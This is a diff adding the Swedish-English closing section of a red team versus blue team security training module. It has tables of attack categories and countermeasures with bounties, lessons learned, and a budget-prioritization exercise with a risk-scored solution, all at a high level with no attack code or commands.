+| Anti-Anti-Detection (Stealth)  | ⭐⭐⭐⭐⭐     | 80%          | $8,000   |
+| Timing Attack                  | ⭐⭐⭐⭐      | 60%          | $5,000   |
+| Token Theft + Replay           | ⭐⭐⭐       | 90%          | $4,000   |
+| Race Condition                 | ⭐⭐⭐       | 40%          | $3,000   |
+| Side-Channel (Geo Bypass)      | ⭐⭐⭐⭐      | 70%          | $4,000   |
+| Memory Corruption              | ⭐⭐⭐⭐⭐     | 20%          | $10,000  |
+| Cryptographic (Key Extract)    | ⭐⭐⭐⭐⭐     | 50%          | $12,000  |
+
+**Total Red Team Bounty: $46,000**
+
+### Blue Team Advanced Defenses
+
+| Countermeasure                 | Effectiveness | Cost      |
+|--------------------------------|---------------|-----------|
+| Advanced Frida Detection       | 85%           | Medium    |
+| Hardware-Backed Security (TPM) | 95%           | High      |
+| Distributed Validation         | 90%           | Medium    |
+| Honeypot Features              | 100%*         | Low       |
+| ML Anomaly Detection           | 75%           | High      |
+
+\* 100% för detection, men stoppar ej attack
+
+**Total Blue Team Bounty: $25,000**
+
+---
+
+## 🎓 Expert Lessons Learned
+
+### The Arms Race
+
+```
+Round 1: Client-side check → Server-side enforcement
+Round 2: Anti-tampering → Anti-anti-tampering
+Round 3: Advanced detection → Stealth techniques
+Round 4: Hardware security → Side-channel attacks
+Round 5: ML detection → Adversarial ML evasion
+...
+∞
+```
+
+### Fundamental Truths
+
+1. **Client kan ALLTID komprometteras** med tillräckligt tid/resurser
+2. **Defense in Depth är kritiskt** - ett lager räcker aldrig
+3. **Detection > Prevention** - du kan inte förhindra allt, men du kan detektera
+4. **Cost vs Benefit** - gör det dyrt nog att attackera
+5. **Zero Trust Architecture** - verifiera ALLT, lita på INGET
+
+### Real-World Takeaways
+
+**För Red Team:**
+- Kreativitet vinner över brute force
+- Kombinera attack vectors för max effekt
+- Dokumentation är nyckeln till bounty
+- Etik är ej negotiable
+
+**För Blue Team:**
+- Perfect security existerar ej
+- Balance security vs user experience
+- Monitoring är lika viktigt som prevention
+- Continuous improvement via threat modeling
+
+---
+
+## 🎯 Final Challenge för Läsaren
+
+Du är Blue Team lead. Red Team har precis demonstrerat alla 7 attack vectors ovan. Du har 30 dagar och $100,000 budget att förbättra säkerheten.
+
+**Din uppgift:**
+
+1. Prioritera vilka attack vectors du fixar först (och varför)
+2. Designa comprehensive defense strategy
+3. Beräkna ROI för varje åtgärd
+4. Föreslå monitoring för att detektera framtida attacks
+
+<details>
+<summary>Expert Solution Framework</summary>
+
+**Prioritering (Risk = Impact × Likelihood):**
+
+1. **Cryptographic Attack** (HIGH RISK)
+   - Impact: 10/10 (total compromise)
+   - Likelihood: 5/10 (kräver advanced skills)
+   - Risk Score: 50
+   - Fix: Move to TPM - $15,000
+
+2. **Token Theft** (HIGH RISK)
+   - Impact: 9/10 (user impersonation)
+   - Likelihood: 8/10 (relativt lätt)
+   - Risk Score: 72
+   - Fix: Short-lived tokens + rotation - $5,000
+
+3. **Race Condition** (MEDIUM RISK)
+   - Impact: 6/10 (temporary bypass)
+   - Likelihood: 7/10 (trivial)
+   - Risk Score: 42
+   - Fix: Distributed locking - $10,000
+
+4. **Advanced Frida Stealth** (MEDIUM RISK)
+   - Impact: 8/10
+   - Likelihood: 4/10 (very advanced)
+   - Risk Score: 32
+   - Fix: Multi-layer detection - $20,000
+
+5. **Remaining $50,000**: ML anomaly detection + monitoring infrastructure
+
+**Monitoring Strategy:**
+- Real-time alerting på honeypot access
+- ML-based behavioral analysis
+- Automated incident response
+- Red team exercises quarterly
+
+**Expected Outcome:**
+- 85% reduction i successful attacks
+- <1 hour mean time to detection
+- <4 hours mean time to response
+
+</details>
+
+---
+
+**Grattis! Du har nu genomgått både grundläggande OCH expert-level Red Team vs Blue Team training!** 🏆
+
+*Expert Round 2 - The Arms Race Never Ends*
+*"In security, there are no final victories"*
+*Skapad: 2025 - Educational Purposes Only*
+
